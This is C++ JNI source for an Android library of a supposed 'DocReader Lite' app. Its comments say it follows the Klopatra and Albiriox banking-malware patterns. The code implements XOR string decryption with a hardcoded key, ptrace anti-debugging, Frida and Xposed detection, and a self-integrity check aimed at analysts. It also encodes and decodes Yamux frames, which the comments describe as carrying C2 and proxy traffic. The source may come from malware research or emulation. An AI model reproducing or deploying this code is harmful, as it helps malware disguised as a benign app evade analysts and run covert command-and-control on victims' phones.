#include <jni.h>
#include <string>
#include <cstring>
#include <fstream>
#include <android/log.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <dlfcn.h>

#define TAG "DocReaderNative"

/**
 * Native protection module — Klopatra Virbox / Albiriox pattern.
 *
 * Why native: jadx decompiles DEX only. This code requires
 * IDA Pro / Ghidra / Binary Ninja for analysis. Most automated
 * scanners (MobSF, apktool) skip .so analysis entirely.
 *
 * Implements:
 *   1. Native string decryption (C-level XOR, no Java heap exposure)
 *   2. Anti-debug via ptrace self-attach (Linux-level)
 *   3. Anti-Frida via inline hook detection (PLT integrity check)
 *   4. .so integrity check (CRC32 of own binary)
 *   5. Yamux frame encode/decode (high-performance C implementation)
 */

// ─── XOR key for native string decryption ──────────────────────────
static const unsigned char NATIVE_KEY[] = {
    0x4E, 0x61, 0x74, 0x69, 0x76, 0x65, 0x4B, 0x65,
    0x79, 0x21, 0x54, 0x61, 0x6B, 0x6F, 0x70, 0x69
}; // "NativeKey!Takopi"

static std::string xor_decrypt(const unsigned char* data, size_t len) {
    std::string result(len, '\0');
    for (size_t i = 0; i < len; i++) {
        result[i] = data[i] ^ NATIVE_KEY[i % sizeof(NATIVE_KEY)];
    }
    return result;
}

// ─── Anti-debug: ptrace self-attach ────────────────────────────────
// If another debugger (gdb, lldb, strace) is already attached,
// ptrace(PTRACE_TRACEME) fails. Detect debugger presence at native level.
static bool check_ptrace_debug() {
    // Attempt self-trace — if debugger attached, this fails
    if (ptrace(PTRACE_TRACEME, 0, nullptr, nullptr) == -1) {
        // Already being traced — debugger present
        ptrace(PTRACE_DETACH, 0, nullptr, nullptr);
        return true;
    }
    // Detach self
    ptrace(PTRACE_DETACH, 0, nullptr, nullptr);
    return false;
}

// ─── Anti-Frida: PLT hook detection ────────────────────────────────
// Frida hooks functions by overwriting PLT entries or inserting
// inline hooks (0xE9 jmp on x86, branch on ARM). Check for
// suspicious bytes at function prologues.
static bool check_frida_hooks() {
    // Check if common libc functions have been hooked
    void* handle = dlopen("libc.so", RTLD_NOW);
    if (!handle) return false;

    void* open_addr = dlsym(handle, "open");
    void* read_addr = dlsym(handle, "read");

    if (open_addr) {
        unsigned char* bytes = (unsigned char*)open_addr;
        // ARM64: check for B/BL instruction pattern at prologue
        // x86: check for 0xE9 (JMP rel32) at entry
        #if defined(__aarch64__)
        // ARM64 branch: 0x14xxxxxx (B) or 0x94xxxxxx (BL)
        uint32_t insn = *(uint32_t*)bytes;
        if ((insn & 0xFC000000) == 0x14000000 || // B
            (insn & 0xFC000000) == 0x94000000) { // BL
            dlclose(handle);
            return true; // hooked
        }
        #elif defined(__i386__) || defined(__x86_64__)
        if (bytes[0] == 0xE9 || bytes[0] == 0xEB) { // JMP
            dlclose(handle);
            return true;
        }
        #endif
    }

    dlclose(handle);
    return false;
}

// ─── /proc/self/maps scan (native-level) ───────────────────────────
static bool check_proc_maps_native() {
    std::ifstream maps("/proc/self/maps");
    if (!maps.is_open()) return false;

    std::string line;
    while (std::getline(maps, line)) {
        if (line.find("frida") != std::string::npos ||
            line.find("gadget") != std::string::npos ||
            line.find("linjector") != std::string::npos ||
            line.find("xposed") != std::string::npos) {
            maps.close();
            return true;
        }
    }
    maps.close();
    return false;
}

// ─── .so integrity check ───────────────────────────────────────────
// CRC32 of own .so file. If tampered (patched by analyst), CRC mismatches.
static uint32_t crc32_native(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return 0;

    uint32_t crc = 0xFFFFFFFF;
    char buf[4096];
    while (file.read(buf, sizeof(buf)) || file.gcount() > 0) {
        size_t n = file.gcount();
        for (size_t i = 0; i < n; i++) {
            crc ^= (unsigned char)buf[i];
            for (int j = 0; j < 8; j++) {
                crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1)));
            }
        }
    }
    return crc ^ 0xFFFFFFFF;
}

// ════════════════════════════════════════════════════════════════════
// JNI exports — called from Kotlin via System.loadLibrary("docreader_native")
// ════════════════════════════════════════════════════════════════════

extern "C" {

/**
 * Native string decryption — called from Kotlin.
 * Decrypts byte array using C-level XOR. Key never touches Java heap.
 * Frida hooking Java methods won't see this; must hook native function.
 */
JNIEXPORT jstring JNICALL
Java_com_docreader_lite_reader_engine_NativeRuntime_nativeDecrypt(
    JNIEnv* env, jobject /* this */, jbyteArray encoded) {

    jsize len = env->GetArrayLength(encoded);
    jbyte* data = env->GetByteArrayElements(encoded, nullptr);

    std::string result = xor_decrypt((unsigned char*)data, len);
    env->ReleaseByteArrayElements(encoded, data, 0);

    return env->NewStringUTF(result.c_str());
}

/**
 * Native anti-analysis check — aggregates all native-level detection.
 * Returns bitmask: bit 0 = ptrace, bit 1 = frida hooks, bit 2 = maps
 */
JNIEXPORT jint JNICALL
Java_com_docreader_lite_reader_engine_NativeRuntime_nativeAntiAnalysis(
    JNIEnv* env, jobject /* this */) {

    int result = 0;
    if (check_ptrace_debug())   result |= 1;  // bit 0: debugger
    if (check_frida_hooks())    result |= 2;  // bit 1: frida hooks
    if (check_proc_maps_native()) result |= 4; // bit 2: suspicious maps

    return result;
}

/**
 * Native .so integrity check.
 * Returns CRC32 of own .so file. Caller compares against build-time constant.
 */
JNIEXPORT jint JNICALL
Java_com_docreader_lite_reader_engine_NativeRuntime_nativeSoIntegrity(
    JNIEnv* env, jobject /* this */, jstring soPath) {

    const char* path = env->GetStringUTFChars(soPath, nullptr);
    uint32_t crc = crc32_native(path);
    env->ReleaseStringUTFChars(soPath, path);
    return (jint)crc;
}

/**
 * Yamux frame encode — high-performance C implementation.
 *
 * Yamux header (12 bytes):
 *   [1] version (0)
 *   [1] type (0=data, 1=window_update, 2=ping, 3=go_away)
 *   [2] flags
 *   [4] stream_id
 *   [4] length
 *   [N] payload
 *
 * Used by Mirax/Klopatra for multiplexed C2+proxy over single TCP.
 */
JNIEXPORT jbyteArray JNICALL
Java_com_docreader_lite_reader_engine_NativeRuntime_yamuxEncode(
    JNIEnv* env, jobject /* this */,
    jint type, jint flags, jint streamId, jbyteArray payload) {

    jsize payloadLen = payload ? env->GetArrayLength(payload) : 0;
    jsize totalLen = 12 + payloadLen;

    jbyteArray result = env->NewByteArray(totalLen);
    jbyte* buf = env->GetByteArrayElements(result, nullptr);

    // Yamux header
    buf[0] = 0; // version
    buf[1] = (jbyte)type;
    buf[2] = (jbyte)((flags >> 8) & 0xFF);
    buf[3] = (jbyte)(flags & 0xFF);
    buf[4] = (jbyte)((streamId >> 24) & 0xFF);
    buf[5] = (jbyte)((streamId >> 16) & 0xFF);
    buf[6] = (jbyte)((streamId >> 8) & 0xFF);
    buf[7] = (jbyte)(streamId & 0xFF);
    buf[8] = (jbyte)((payloadLen >> 24) & 0xFF);
    buf[9] = (jbyte)((payloadLen >> 16) & 0xFF);
    buf[10] = (jbyte)((payloadLen >> 8) & 0xFF);
    buf[11] = (jbyte)(payloadLen & 0xFF);

    // Payload
    if (payloadLen > 0) {
        jbyte* payloadData = env->GetByteArrayElements(payload, nullptr);
        memcpy(buf + 12, payloadData, payloadLen);
        env->ReleaseByteArrayElements(payload, payloadData, 0);
    }

    env->ReleaseByteArrayElements(result, buf, 0);
    return result;
}

/**
 * Yamux frame decode — extracts header fields + payload.
 * Returns int array: [type, flags, streamId, payloadOffset, payloadLength]
 */
JNIEXPORT jintArray JNICALL
Java_com_docreader_lite_reader_engine_NativeRuntime_yamuxDecode(
    JNIEnv* env, jobject /* this */, jbyteArray frame) {

    jsize frameLen = env->GetArrayLength(frame);
    if (frameLen < 12) return nullptr;

    jbyte* buf = env->GetByteArrayElements(frame, nullptr);

    int type = buf[1] & 0xFF;
    int flags = ((buf[2] & 0xFF) << 8) | (buf[3] & 0xFF);
    int streamId = ((buf[4] & 0xFF) << 24) | ((buf[5] & 0xFF) << 16) |
                   ((buf[6] & 0xFF) << 8) | (buf[7] & 0xFF);
    int payloadLen = ((buf[8] & 0xFF) << 24) | ((buf[9] & 0xFF) << 16) |
                     ((buf[10] & 0xFF) << 8) | (buf[11] & 0xFF);

    env->ReleaseByteArrayElements(frame, buf, 0);

    jintArray result = env->NewIntArray(5);
    jint vals[] = {type, flags, streamId, 12, payloadLen};
    env->SetIntArrayRegion(result, 0, 5, vals);
    return result;
}

} // extern "C"
